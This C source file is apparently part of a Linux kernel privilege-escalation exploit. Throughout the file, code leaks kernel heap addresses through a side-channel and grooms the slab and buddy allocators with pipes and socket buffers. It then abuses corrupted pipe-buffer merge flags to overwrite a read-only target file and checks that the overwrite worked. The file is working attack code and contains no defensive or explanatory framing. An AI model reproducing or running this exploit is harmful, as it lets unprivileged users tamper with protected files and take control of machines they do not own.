#include "common.h"

#define PHYSRW_PROOF_OFF 0x7000
#define PHYS_READ_TAG "nebusec_70687973727730"
#define PHYS_WRITE_TAG "nebusec_70687973727731"
#define PHYS64_SEED 0x306365737562656eULL
#define PHYS64_NEXT 0x316365737562656eULL

static int pipe_objects_ready;
int pipe_fds_drain[PIPE_DRAIN][2];
int pipe_fds_reclaim[PIPE_RECLAIM][2];

pid_t pipe_prepare_child = -1;
uintptr_t pipebuf_page_base;

void init_ctx(struct mm_ctx *ctx, size_t cnt) {
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
}

void resize_pipe_slots(int pipefd[2], size_t slots) {
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
}

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  resize_pipe_slots(pipefd, 2);
}

void alloc_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
}

/*
 * prepare_pipe_buffer_page_child — runs in a forked child.
 *
 * Sprays mm_structs, leaks one via KernelSnitch, then:
 *   1. Frees the leaked mm_struct's order-3 slab page.
 *   2. Recaptures it with an sk_buff frag (skb_sv sendmsg).
 *   3. Drains all kmalloc-cgroup-2k partials so reclaim pipes get a fresh slab.
 *   4. Frees the sk_buff; the order-3 page returns to buddy HEAD (no shuffle
 *      at order-3: is_shuffle_order(3) = 3 >= MAX_PAGE_ORDER=10 → false).
 *   5. Allocates reclaim pipe->bufs; the first allocation triggers new_slab()
 *      and takes 'base' from buddy → reclaim[0]->bufs lands at 'base'.
 *
 * Returns 'base' (the 32KB-aligned page address) on success, 0 on failure.
 */
uintptr_t prepare_pipe_buffer_page_child(void) {
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  /* Large prep spray pins slab pages, preventing the target page from being
   * absorbed by other mm_struct slab allocations.  The prep memfds are kept
   * open until this child process exits (SIGKILL from reset_pipe_attempt). */
  struct mm_ctx prep;
  init_ctx(&prep, 32 * objs_per_slab);
  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }

  unsigned char *buf = malloc(SKB_SEND_SIZE);
  memset(buf, 0x50, SKB_SEND_SIZE);

  int skb_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  struct ks_spray_state s;
  if (!ks_spray_collisions(&s, objs_per_slab, MM_PARTIALS)) {
    pr_warning("pipe KernelSnitch collision finding failed\n");
    close(skb_sv[0]); close(skb_sv[1]);
    free(buf);
    return 0;
  }

  ks_spray_pcp_shape(&s, buf);

  /* Free the mm_struct slab page; immediately recapture with an sk_buff frag.
   * The freed order-3 page goes to buddy HEAD (LIFO, no shuffle at order-3),
   * so the very next order-3 frag allocation takes it. */
  SYSCHK(close(s.leak_memfd));
  SYSCHK(sendmsg(skb_sv[0], &msg, 0));

  uintptr_t leaked = ks_spray_result(&s);
  if (leaked == (uintptr_t)-1) {
    pr_warning("pipe KernelSnitch sk_buff page leak failed\n");
    close(skb_sv[0]); close(skb_sv[1]);
    free(buf);
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  int mm_slot = (int)((leaked - base) / PIPE_OBJECT_SIZE);
  pr_info("pipe page: leaked=%016zx base=%016zx mm_offset=%04zx mm_slot_in_2k=%d\n",
          leaked, base, leaked - base, mm_slot);

  /* Drain: exhaust all kmalloc-cgroup-2k partial slabs so that reclaim[0]
   * triggers new_slab() → takes 'base' from buddy HEAD. */
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    alloc_pipe_object(pipe_fds_drain[i]);
  }

  /* Free the sk_buff.  Its single-object page → returned to buddy HEAD. */
  pin_to_core(CORE);
  SYSCHK(close(skb_sv[0]));
  SYSCHK(close(skb_sv[1]));

  /* Reclaim: partials exhausted above, so reclaim[0] gets 'base' as its new
   * slab page.  Slot-0 of that page = reclaim[0]->bufs. */
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    alloc_pipe_object(pipe_fds_reclaim[i]);
  }

  free(buf);
  return base;
}

uintptr_t prepare_pipe_buffer_page(void) {
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    make_pipe_object(pipe_fds_drain[i]);
  }
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    make_pipe_object(pipe_fds_reclaim[i]);
  }
  pipe_objects_ready = 1;

  int result_pipe[2];
  SYSCHK(pipe(result_pipe));
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    if (getppid() == 1)
      _exit(0);
    SYSCHK(close(result_pipe[0]));
    uintptr_t base = prepare_pipe_buffer_page_child();
    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
    for (;;) {
      sleep(60);
    }
  }

  pipe_prepare_child = child;
  SYSCHK(close(result_pipe[1]));
  uintptr_t base = 0;
  ssize_t got = read(result_pipe[0], &base, sizeof(base));
  SYSCHK(close(result_pipe[0]));
  if (got != (ssize_t)sizeof(base)) {
    pr_warning("pipe page child did not report base (got %zd)\n", (size_t)got);
    return 0;
  }
  return base;
}

void reset_pipe_attempt(void) {
  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }

  if (pipe_objects_ready) {
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
    }
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      close(pipe_fds_reclaim[i][0]);
      close(pipe_fds_reclaim[i][1]);
    }
    pipe_objects_ready = 0;
  }

  pipebuf_page_base = 0;
}

int try_pipe_flags_stage(void) {
  const char *target = pipe_overwrite_target();
  pr_info("Trying to overwrite %s.\n", target);
  const char *pipe_overwrite_content = PIPE_OVERWRITE_CONTENT;
  int overwrite_len = strlen(pipe_overwrite_content);

  // Warm-read: ensure PG_uptodate is set on the target page
  {
    int warm_fd = open(target, O_RDONLY);
    if (warm_fd >= 0) {
      char warmb;
      read(warm_fd, &warmb, 1);
      close(warm_fd);
    } else {
      pr_warning("warm-read %s failed errno=%d\n", target, errno);
      return -1;
    }
  }

  /* Write to reclaim pipes only: CAN_MERGE lands on reclaim[0..15] (the slots
   * of pipebuf_page_base).  Drain pipes never land on pipebuf_page_base. */
  int write_fail_count = 0, write_ok_count = 0;
  for (int i = 0; i < PIPE_RECLAIM; i++) {
    int n = write(pipe_fds_reclaim[i][1], pipe_overwrite_content, overwrite_len);
    if (n != overwrite_len) {
      write_fail_count++;
      if (write_fail_count <= 3)
        pr_info("pipe write failed: i=%d fd=%d n=%d errno=%d\n",
                i, pipe_fds_reclaim[i][1], n, errno);
    } else {
      write_ok_count++;
    }
  }
  pr_info("pipe writes: ok=%d fail=%d\n", write_ok_count, write_fail_count);

  int fd = open(target, O_RDONLY);
  if (fd < 0) {
    pr_warning("readback open %s failed errno=%d\n", target, errno);
    return -1;
  }
  if (lseek(fd, 1, SEEK_SET) != 1) {
    pr_warning("readback lseek failed errno=%d\n", errno);
    close(fd);
    return -1;
  }
  char *buf = malloc(overwrite_len);
  if (buf == NULL) {
    pr_warning("readback malloc failed\n");
    close(fd);
    return -1;
  }
  if (read(fd, buf, overwrite_len) != overwrite_len) {
    pr_warning("readback read failed errno=%d\n", errno);
    free(buf);
    close(fd);
    return -1;
  }
  close(fd);

  pr_info("Detected bytes:\n");
  pr_info("readback[0..31]:");
  for (int i = 0; i < 32 && i < overwrite_len; i++)
    fprintf(stdout, " %02x", (unsigned char)buf[i]);
  fprintf(stdout, "\n");
  pr_info("expected[0..31]:");
  for (int i = 0; i < 32 && i < overwrite_len; i++)
    fprintf(stdout, " %02x", (unsigned char)pipe_overwrite_content[i]);
  fprintf(stdout, "\n");

  if (memcmp(buf, pipe_overwrite_content, overwrite_len) == 0) {
    pr_success("pipe overwrite succeeded.\n");
    free(buf);
    return 0;
  }
  pr_warning("pipe overwrite failed.\n");
  free(buf);
  return -1;
}
